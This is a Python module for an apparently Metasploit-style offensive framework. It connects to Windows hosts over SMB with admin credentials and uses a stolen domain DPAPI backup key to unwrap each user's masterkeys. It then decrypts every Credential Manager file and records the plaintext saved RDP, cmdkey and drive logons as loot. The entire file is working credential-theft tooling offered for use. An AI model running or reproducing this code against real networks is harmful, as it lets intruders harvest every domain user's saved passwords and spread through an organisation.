"""DPAPI credential triage: saved-logon plaintext out of every domain
user's Credential Manager, with the domain backup key (DPAPI stage 3).

The chain pays off here. Stage 1 (dpapi_backupkey) pulls the backup key
pair; this module walks a target's profiles over SMB, unwraps each
user's masterkeys on the fly (stage 2's crypto, shared in core/dpapi),
then decrypts every credential file it finds — cmdkey entries, saved
RDP creds, mapped-drive logons — as (target, username, secret) triples
that land in creds AND loot.

Layout per user profile (both walked):

  AppData\\Roaming\\Microsoft\\Protect\\<sid>\\<guid>   masterkey files
  AppData\\Roaming\\Microsoft\\Credentials\\<md5>       credential files
  AppData\\Local\\Microsoft\\Credentials\\<md5>         (machine-local)

Masterkey files are guid-named; credential files are named by an MD5
of the target (32-hex, no dashes — learned live), so the credential
walk takes every file and lets the parser decide. Each credential
file is a CredentialFile wrapping a DPAPI_BLOB; the blob's
GuidMasterKey names the masterkey that opens it (the filename in the
Protect dir), and the plaintext is a CREDENTIAL_BLOB whose
Target/Username/Unknown3 (the secret) are UTF-16-LE.
"""

from core import dpapi as dpapix
from core.module import AuxiliaryModule
from core.options import OptAddress, OptPort, OptString

try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None  # console gates run() on requirements

SKIP_DIRS = (".", "..", "Public", "Default", "Default User", "All Users")


class DpapiCredentials(AuxiliaryModule):
    name = "DPAPI Credential Triage (domain backup key)"
    description = """
        Walks a target's profiles over SMB and decrypts every Credential
        Manager file with the domain backup key (latest dpapi-backupkey
        loot, or KEY_LOOT to pick one): masterkeys are unwrapped on the
        fly, each credential blob is matched by its GuidMasterKey, and
        the plaintext lands in creds + loot — saved RDP/cmdkey/drive
        logons from every domain user on the box.
    """
    authors = ["you"]
    requirements = ["impacket", "Cryptodome"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target(s) with profiles, "
                                                "comma-separated"))
        self.options.add(OptPort("RPORT", default=445,
                                 description="SMB port"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local)"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Target admin"))
        self.options.add(OptString("PASSWORD", required=True,
                                   description="Password"))
        self.options.add(OptString("KEY_LOOT", default="",
                                   description="dpapi-backupkey loot label "
                                               "(blank = latest)"))

    def run(self):
        store = getattr(self.framework, "store", None)
        key, reason = dpapix.find_backup_key(
            store, str(self.get_option("KEY_LOOT") or "").strip())
        if key is None:
            self.print_error(reason)
            return
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._loot_host(host, key, store)

    def _loot_host(self, host, backup_key, store):
        try:
            conn = SMBConnection(host, host,
                                 sess_port=int(self.get_option("RPORT")),
                                 timeout=20)
            conn.login(str(self.get_option("USERNAME")),
                       str(self.get_option("PASSWORD")),
                       str(self.get_option("DOMAIN") or "."))
        except Exception as e:
            self.print_error(f"{host}: SMB login failed - {e}")
            return
        try:
            for user_dir in self._list(conn, "Users\\*"):
                if user_dir in SKIP_DIRS:
                    continue
                self._loot_user(conn, host, user_dir, backup_key, store)
        finally:
            conn.close()

    def _loot_user(self, conn, host, user_dir, backup_key, store):
        # this user's masterkeys first — the credential blobs name the
        # key they need by guid (the filename in the Protect dir)
        masterkeys = {}
        protect = f"Users\\{user_dir}\\AppData\\Roaming\\Microsoft\\Protect"
        for sid_dir in self._list(conn, f"{protect}\\*"):
            if not sid_dir.startswith("S-"):
                continue
            for entry in self._list(conn, f"{protect}\\{sid_dir}\\*"):
                if not dpapix.is_guid_name(entry):
                    continue
                data = self._read(conn, f"{protect}\\{sid_dir}\\{entry}")
                if data is None:
                    continue
                try:
                    guid, mk = dpapix.decrypt_masterkey_file(
                        data, backup_key)
                except Exception as e:
                    self.print_debug(f"{host}: {user_dir}/{entry}: {e}")
                    continue
                if mk is not None:
                    masterkeys[entry.lower()] = mk
        found = 0
        for scope in ("Roaming", "Local"):
            cdir = f"Users\\{user_dir}\\AppData\\{scope}\\Microsoft" \
                "\\Credentials"
            for entry in self._list_files(conn, f"{cdir}\\*"):
                data = self._read(conn, f"{cdir}\\{entry}")
                if data is None:
                    continue
                try:
                    blob_guid, blob = dpapix.decrypt_credential_file(
                        data, masterkeys)
                except Exception as e:
                    self.print_debug(f"{host}: {user_dir}/"
                                     f"{scope}/{entry}: {e}")
                    continue
                if blob is None:
                    self.print_debug(f"{host}: {user_dir}/{scope}/{entry}: "
                                     f"no masterkey for {blob_guid}")
                    continue
                target, username, secret = dpapix.credential_fields(blob)
                found += 1
                self.print_good(f"{host}: {user_dir} [{scope}]: {target} — "
                                f"{username}:{secret}")
                if store is not None:
                    store.add_cred(host, target, username, secret,
                                   source="dpapi_credentials")
                    store.add_loot("credential",
                                   f"dpapi credential {user_dir}/{scope}/"
                                   f"{entry} ({target}) @ {host}",
                                   f"{username}:{secret}", address=host)
        if found:
            self.print_status(f"{host}: {user_dir}: {found} credential(s) "
                              f"in loot")

    def _list(self, conn, pattern):
        try:
            return [f.get_longname() for f in conn.listPath("C$", pattern)]
        except Exception:
            return []

    def _list_files(self, conn, pattern):
        """Non-directory entries. Credential files are HASH-named
        (32-hex, no dashes — an MD5 of the target), not guid-named
        like masterkeys, so shape decisions belong to the parser,
        not to a filename filter."""
        try:
            return [f.get_longname() for f in conn.listPath("C$", pattern)
                    if not f.is_directory() and
                    f.get_longname() not in (".", "..")]
        except Exception:
            return []

    def _read(self, conn, path):
        try:
            buf = []
            conn.getFile("C$", path, buf.append)
            return b"".join(buf)
        except Exception:
            return None
